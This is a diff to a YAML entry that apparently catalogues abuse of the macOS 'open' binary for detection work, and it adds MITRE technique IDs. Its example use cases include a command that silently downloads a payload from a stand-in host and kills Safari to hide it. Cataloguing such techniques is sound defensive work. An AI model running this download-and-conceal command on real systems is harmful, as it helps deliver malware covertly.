@@ -9,6 +9,8 @@ example_use_cases:
   code: open Malicious.app
   tactics:
   - Execution
+  techniques:
+  - T1204.002
   tags:
   - application
 - name: Download a malicious file
@@ -16,6 +18,8 @@ example_use_cases:
   code: open -g https://mypayload.io/payload.zip; sleep 3; killall Safari
   tactics:
   - Execution
+  techniques:
+  - T1105
 paths:
 - /usr/bin/open
 detections:
